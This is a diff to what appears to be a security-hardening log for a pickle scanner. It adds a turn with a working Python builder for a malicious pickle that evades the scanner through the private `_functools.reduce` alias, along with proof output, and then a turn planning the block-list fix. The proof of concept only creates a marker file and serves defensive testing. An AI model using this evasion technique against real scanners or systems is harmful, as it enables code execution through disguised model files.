@@ -2638,3 +2638,100 @@ Blocking plan:
 Performance note: the fix is a single sorted policy-table entry checked by
 binary search. It does not add alias resolution, callable-flow tracking, or
 special-case analysis for partial object internals.
+
+## Turn 59 - `_functools.reduce` private-alias reducer gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using CPython's private
+`_functools.reduce` alias to bypass the scanner's public `functools.reduce`
+critical policy.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_private_functools_reduce_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("_functools", "reduce"),
+        sg("pathlib", "Path.touch"),
+        b"]",
+        b"M\xb6\x01",
+        b"a",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR",
+        b"\x87R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=121`, `bytes_total=121`, `opcode_count=22`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `_functools.reduce`, `pathlib.Path.touch`, and
+  `pathlib.PosixPath`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `REDUCE` returns
+  `(Path.touch, [0o666], marker)` and does not create
+  `/tmp/ma_private_functools_reduce_marker`
+- Unpickle result: the full payload calls
+  `_functools.reduce(Path.touch, [0o666], marker)`, creates
+  `/tmp/ma_private_functools_reduce_marker`, and returns `None`
+- RCE mechanism: `reduce(function, iterable, initializer)` calls the supplied
+  function with the initializer and the first iterable item. The payload uses
+  the marker path as the initializer and `0o666` as the first item, so
+  `Path.touch(marker, 0o666)` executes during deserialization.
+
+Why the scanner missed it:
+
+- `functools.reduce` is listed as critical, but the private CPython
+  `_functools.reduce` alias is absent from `DANGEROUS_GLOBALS`.
+- `_functools` is absent from `DANGEROUS_WILDCARD_MODULES`.
+- The payload uses only currently clean globals: `_functools.reduce`,
+  `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is a private-alias gap for an already-known reducer
+sink. The focused next block should add a sorted `DANGEROUS_GLOBALS` entry for
+`("_functools", "reduce")`, with a manual-pickle oracle regression proving
+scan-time detection before the reducer creates the marker. The hot path remains
+a static binary-search policy lookup.
+
+## Turn 60 - Block `_functools.reduce` private alias
+
+Blocking plan:
+
+- Add `("_functools", "reduce")` to the sorted dangerous-global table. This
+  private CPython alias reaches the same reducer sink as public
+  `functools.reduce`, which is already considered critical.
+- Add portable Rust policy coverage for raw `_functools.reduce` reductions so
+  detection does not depend on executing the reducer.
+- Add a CPython oracle regression that first proves the reducer arguments only
+  form a tuple in the control pickle, then proves
+  `_functools.reduce(Path.touch, [0o666], marker)` creates the marker during
+  `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]` because this strengthens
+  user-visible pickle detection coverage.
+
+Performance note: the fix is a single sorted policy-table entry checked by
+binary search. It does not add private-alias discovery, reducer-specific stack
+simulation, or callable-flow tracking.
